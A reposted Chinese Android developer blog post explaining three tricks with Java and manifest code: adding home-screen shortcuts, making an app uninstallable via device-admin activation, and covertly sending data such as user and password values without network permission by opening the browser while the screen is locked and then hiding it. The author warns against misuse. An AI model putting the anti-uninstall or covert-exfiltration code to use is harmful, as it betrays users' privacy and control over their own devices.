---
title: Android 黑科技小结
tags: [android,应用]
categories: [android]
date: 2017-07-24 19:53:05
description: （转载）桌面添加快捷方式、无法卸载app(DevicePolicManager)、无网络权限偷偷上传数据
---

转载自：http://www.jianshu.com/p/8f9b44302139


# 桌面添加快捷方式
不知道大家有没有被这种流氓软件袭击过，你打开过他一次，后面就泪流满面的给你装了满满的一屏幕其他乱七八糟的一堆快捷方式。注意可能会误认为被偷偷安装了其他App，实际上他只是一个带图标的Intent在你的桌面上，但不排除root后的机器安装app是真的，但我们今天这里只讲快捷方式。


## 快捷方式有什么用？
- 1.可以给用户一个常用功能的快捷入口（推荐）
- 2.搭配插件化技术实现模拟安装后的app体验（推荐）
- 3.做黑产（黑色产业链的东西我不想说了，只需要记得咱们是有原则的开发者，坚决抵制做垃圾App。即使别人给钱也不做。就这么任性　（ˇ＾ˇ〉）



**原理解析：**

我们已经把AndroidManifest写烂了，一眼看过去就知道这个标签的作用。

```html
 <activity android:name=".xxx">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>
```


没错，我们再熟悉不过了，一般我们理解成将作为App的第一个被启动的Activity声明。实际上我们知道Android的桌面（launcher ，一般做rom层的同学接触比较多）上点击任意一个app都是通过Intent启动的。
神曾经说过，不懂的地方。*read the fucking source code*，那么我们来趴一趴launcher的源码，它是如何接收到我们要添加的快捷方式的。（别害怕，源码没有想象中那么难度，跳着看。屏蔽我们不关注的部分。）

拿到一个Android应用层的项目第一件事情干嘛？看配置文件呗。来我们瞅一眼launcher的AndroidManifest。

```html
<manifest  
    xmlns:android="http://schemas.android.com/apk/res/android"  
    package="com.android.launcher"> 
	
    <!--为了便于阅读，我省略了跟本篇无关紧要的代码 -->
	
    <!-- Intent received used to install shortcuts from other applications -->  
    <receiver  
        android:name="com.android.launcher2.InstallShortcutReceiver"  
        android:permission="com.android.launcher.permission.INSTALL_SHORTCUT">  
        <intent-filter>  
            <action android:name="com.android.launcher.action.INSTALL_SHORTCUT" />  
        </intent-filter>  
    </receiver>  
    <!-- Intent received used to uninstall shortcuts from other applications -->  
    <receiver  
        android:name="com.android.launcher2.UninstallShortcutReceiver"  
        android:permission="com.android.launcher.permission.UNINSTALL_SHORTCUT">  
        <intent-filter>  
            <action android:name="com.android.launcher.action.UNINSTALL_SHORTCUT" />  
        </intent-filter>  
    </receiver> 
	
</manifest>
```




注意我们发现了两个receiver标签，从上面的注释可以发现

&lt;!-- Intent received used to install shortcuts from other applications --&gt;

接收其他应用安装的快捷方式意图。这里就表明了launcher 是通过广播来添加快捷方式的。我们接着翻源码，看他是怎么处理这条广播的。根据receiver里的name标签我们找到InstallShortcutReceiver.java这个类。
首先我们发现他继承了BroadcastReceiver ，很明显就是一个广播接收者，我们直接看onReceive方法里如何处理的。

```java
//代码细节部分省略太长了，不方便贴。可以自己去下载源码看。
public class InstallShortcutReceiver extends BroadcastReceiver {
	//做了很多处理，比如寻找将接受到的快捷方式放在屏幕的哪个位置、重复的图标提示等
	public void onReceive(Context context, Intent data) {
     //判断这条广播的合法性
		if (!ACTION_INSTALL_SHORTCUT.equals(data.getAction())) {
            return;
        }
    ·····
	}

	//最终我们发现了这个方法，将快捷方式添加到桌面并存储到数据库
    private static boolean installShortcut(Context context, Intent data, ...参数省略) {
		·····
		if (intent.getAction() == null) {
            intent.setAction(Intent.ACTION_VIEW);
        } else if (intent.getAction().equals(Intent.ACTION_MAIN) &&
            intent.getCategories() != null &&
            intent.getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
			intent.addFlags(
				Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED);
        }
		····
	}
	····

｝
```



重点看下面这几行，顺藤摸瓜得知这个Intent来自来自别的app或系统发过来的广播。下面黄横线的部分已经解释了，我们自己平时开发的app配置的主启动项Activitiy intent-filter在哪里被用到了。这里接收到后的intent将加到桌面并存储到数据库中。由此算是明白了系统到底是怎么做的。
![temp_pic2](2.png)


**实现添加快捷方式：**
好，既然已经知道原理了，我们现在就来实现一把，怎么添加一个任意的图标到桌面。
首先我们需要配置权限声明

```html
<uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT" />
<uses-permission android:name="com.android.launcher.permission.UNINSTALL_SHORTCUT" />
```

第二步捏造一个添加快捷方式的广播，具体请看下面的代码。注意里面有两个Intent，其中一个是广播的，一个是我们自己下次启动快捷方式时要用的，启动时可以携带Intent参数。（能做什么，知道了吧？哈哈）
下面们调用一下看看。这里我添加了四个快捷方式，分别是abcd、abc、ab、a，然后我们返回桌面看一眼。他们都是可以启动的。

```java
    public static void addShortcut(Activity cx, String name) {
        // TODO: 2017/6/25  创建快捷方式的intent广播
        Intent shortcut = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
        // TODO: 2017/6/25 添加快捷名称
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);
        //  快捷图标是允许重复
        shortcut.putExtra("duplicate", false);
        // 快捷图标
        Intent.ShortcutIconResource iconRes = Intent.ShortcutIconResource.fromContext(cx, R.mipmap.ic_launcher);
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE, iconRes);
        // TODO: 2017/6/25 我们下次启动要用的Intent信息
        Intent carryIntent = new Intent(Intent.ACTION_MAIN);
        carryIntent.putExtra("name", name);
        carryIntent.setClassName(cx.getPackageName(),cx.getClass().getName());
        carryIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        //添加携带的Intent
        shortcut.putExtra(Intent.EXTRA_SHORTCUT_INTENT, carryIntent);
        // TODO: 2017/6/25  发送广播
        cx.sendBroadcast(shortcut);
    }
```

![temp_pic4](4.gif)


github地址：https://github.com/BolexLiu/AddShortcut
# 无法卸载app(DevicePolicManager)
DevicePolicManager 可以做什么？
- 1.恢复出厂设置
- 2.修改屏幕解锁密码
- 3.修改屏幕密码规则长度和字符
- 4.监视屏幕解锁次数
- 5.锁屏幕
- 6.设置锁屏密码有效期
- 7.设置应用数据加密
- 8.禁止相机服务，所有app将无法使用相机

首先我想，如果你是一个Android重度体验用户，在Rom支持一键锁屏之前，你也许装过一种叫快捷锁屏、一键锁屏之类的替代实体键锁屏的应用。其中导致的问题就是当我们不需要用它的时候却发现无法被卸载。
**原理解析：**

从功能上来看，本身该项服务是用来控制设备管理，它是Android用来提供对系统进行管理的。所以一但获取到权限，不知道Android出于什么考虑,系统是不允许将其卸载掉的。我们只是在这里钻了空子。
**实现步骤：**

继承DeviceAdminReceiver类，里面的可以不要做任何逻辑处理。

```java
public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
}
```

注册一下，description可以写一下你给用户看的描述。

```html
<receiver
    android:name=".MyDeviceAdminReceiver"
    android:description="@string/description"
    android:label="防卸载"
    android:permission="android.permission.BIND_DEVICE_ADMIN" >
    <meta-data
        android:name="android.app.device_admin"
        android:resource="@xml/deviceadmin" />

    <intent-filter>
		<action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
    </intent-filter>
</receiver>
```

调用系统激活服务

```java
// 激活设备超级管理员
public void activation() {
    Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
    // 初始化要激活的组件
    ComponentName mDeviceAdminSample = new ComponentName(MainActivity.this, MyDeviceAdminReceiver.class);
    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活可以防止随意卸载应用");
    startActivity(intent);
}
```


我们来看下运行的效果。激活以前是可以被卸载的。

![before_pic6](6.gif)


激活以后无法被卸载，连删除按钮都没有了。就算你拿其他安全工具或系统的卸载也不能卸载哦。

![after_pic8](8.gif)


但是我们可以在设备管理器中可以取消激活就恢复了。这里我们是正常的方式来激活，不能排除root后的设备，当app拿到root权限后将自己提权自动激活，或者将自身写入到系统app区域，达到无法卸载的目的。所以我们常说root后的设备是不安全的也就在这里能说明问题。
github地址：https://github.com/BolexLiu/SuPerApp
# 无网络权限偷偷上传数据
这是一种超流氓的方式，目前市面上是存在这种app的。普通用户不太注意的话一般发现不了。另一个对立面说用户把app的访问网络权限禁用了如何告诉服务器消息呢？
**原理解析：**

虽然应用没有权限，或者我们之前有权限被用户屏蔽了。但是我们可以借鸡下蛋，调用系统浏览器带上我们要访问的参数。实际在服务端收到的时候就是一个get请求可以解析后面拼接出的参数。比如：
```
http://192.168.0.2/send?user=1&pwd=2
```
 这样就可以把user和pwd提交上去。当然这一切还不能被用户发现，所以很变态的判断用户锁屏后就打开浏览器发送消息，用户一旦解锁就回到桌面上，假装一切都没有发生过。


**实现代码：**

本来我不准备把代码贴出来的，但想了一下又有何妨。即便我不贴出来你也能找到，也能跟着思路写出来。但是千万千万不要给用户做这种东西。拜托了各位。

```java
		Timer  timer = new Timer();
        final KeyguardManager  km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        TimerTask   task = new TimerTask() {
            @Override
            public void run() {
                // TODO: 2017/6/26  如果用户锁屏状态下，就打开网页通过get方式偷偷传输数据
                if (km.inKeyguardRestrictedInputMode()) {
                    Intent intent = new Intent();
                    intent.setAction(Intent.ACTION_VIEW);
                    intent.addCategory(Intent.CATEGORY_BROWSABLE);
                    intent.setData(Uri
                            .parse("http://192.168.0.2/send?user=1&pwd=2"));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }else{
                    // TODO: 2017/6/26  判断如果在桌面就什么也不做 ,如果不在桌面就返回
                    Intent intent = new Intent();
                    intent.setAction("android.intent.action.MAIN");
                    intent.addCategory("android.intent.category.HOME");
                    intent.addCategory(Intent.CATEGORY_DEFAULT);
                    intent.addCategory("android.intent.category.MONKEY");
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                }
            }
        };
        timer.schedule(task, 1000, 2000);
```



